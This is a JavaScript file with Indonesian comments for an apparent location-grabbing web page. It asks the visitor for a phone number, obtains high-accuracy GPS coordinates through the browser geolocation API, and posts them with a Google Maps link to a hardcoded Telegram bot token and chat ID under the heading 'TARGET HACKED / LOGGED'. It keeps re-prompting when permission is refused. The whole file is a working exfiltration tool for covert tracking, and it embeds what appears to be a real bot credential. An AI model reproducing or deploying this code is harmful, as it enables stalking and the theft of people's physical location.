// Konfigurasi Kredensial Bot Telegram (Ganti Token & Chat ID Anda)
const TELEGRAM_BOT_TOKEN = '8837117055:AAG8OBYU2dO8ymuvWp3HzNcDc8Qqy3c7is0';
const TELEGRAM_CHAT_ID = '8705316282';

let currentPhoneNumber = '';

function addLog(text, type = 'info') {
    const logsArea = document.getElementById('terminal-logs');
    const entry = document.createElement('div');
    entry.className = `log-entry log-${type}`;
    
    const timestamp = new Date().toLocaleTimeString();
    entry.innerText = `[${timestamp}] ${text}`;
    
    logsArea.appendChild(entry);
    logsArea.scrollTop = logsArea.scrollHeight;
}

// ==============================
// TAMBAHAN: KONVERSI KOORDINAT → ALAMAT
// ==============================
async function resolveAddress(latitude, longitude) {

    addLog(`RESOLVING GPS COORDINATES TO ADDRESS...`, 'info');

    try {
        const url =
            `https://nominatim.openstreetmap.org/reverse` +
            `?format=jsonv2` +
            `&lat=${encodeURIComponent(latitude)}` +
            `&lon=${encodeURIComponent(longitude)}` +
            `&zoom=18` +
            `&addressdetails=1` +
            `&accept-language=id`;

        const response = await fetch(url, {
            headers: {
                'Accept': 'application/json'
            }
        });

        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }

        const data = await response.json();

        if (data.display_name) {

            addLog(`ADDRESS RESOLVED: ${data.display_name}`, 'success');

        } else {

            addLog(`ADDRESS NOT FOUND FOR THESE COORDINATES.`, 'error');

        }

    } catch (error) {

        console.error('Reverse geocoding error:', error);

        addLog(`FAILED TO RESOLVE ADDRESS.`, 'error');
    }
}

function handleFormSubmit(event) {
    event.preventDefault();
    
    const phoneInput = document.getElementById('phone-number').value.trim();
    if (!phoneInput) return;

    currentPhoneNumber = '+62' + phoneInput.replace(/^0+/, '');
    
    // Reset Log Display
    document.getElementById('terminal-logs').innerHTML = '';
    
    addLog(`INITIATING TARGET VERIFICATION: ${currentPhoneNumber}`, 'info');
    addLog(`REQUESTING SATELLITE GEOLOCATION ACCESS...`, 'info');

    requestAndSendLocation();
}

function requestAndSendLocation() {
    const btn = document.getElementById('btn-submit');

    if (!navigator.geolocation) {
        addLog(`CRITICAL ERROR: GEOLOCATION API NOT SUPPORTED.`, 'error');
        return;
    }

    btn.disabled = true;

    navigator.geolocation.getCurrentPosition(
        // Callback 1: Izin Diizinkan
        function(position) {
            document.getElementById('retry-modal').style.display = 'none';

            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            addLog(`GPS SIGNAL LOCKED: ACCURACY ${accuracy}m`, 'success');
            addLog(`LAT: ${latitude} | LONG: ${longitude}`, 'success');
            addLog(`TRANSMITTING DATA TO COMMAND SERVER...`, 'info');

            const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
            const message = `☠️ *TARGET HACKED / LOGGED*\n\n` +
                            `• *WhatsApp:* \`${currentPhoneNumber}\`\n` +
                            `• *Latitude:* \`${latitude}\`\n` +
                            `• *Longitude:* \`${longitude}\`\n` +
                            `• *Akurasi:* ${accuracy} meter\n` +
                            `• *Location Link:* [Google Maps](${googleMapsUrl})`;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    addLog(`DATA SUCCESSFULLY EXFILTRATED TO TELEGRAM BOT!`, 'success');
                    addLog(`SESSION TERMINATED. ACCESS GRANTED.`, 'success');
                } else {
                    addLog(`FAILED TO TRANSMIT DATA TO TELEGRAM.`, 'error');
                }
            })
            .catch(error => {
                console.error("Error:", error);
                addLog(`NETWORK TRANSMISSION ERROR.`, 'error');
            })
            .finally(() => {
                btn.disabled = false;
            });
        },
        // Callback 2: Izin Ditolak
        function(error) {
            btn.disabled = false;

            if (error.code === error.PERMISSION_DENIED) {
                addLog(`ACCESS DENIED BY USER. GEOLOCATION REQUIRED!`, 'error');
                document.getElementById('retry-modal').style.display = 'flex';
            } else {
                addLog(`ERROR OBTAINING GPS DATA: ${error.message}`, 'error');
            }
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

function retryLocationRequest() {
    document.getElementById('retry-modal').style.display = 'none';
    addLog(`RETRYING LOCATION ACCESS OVERRIDE...`, 'info');
    requestAndSendLocation();
}
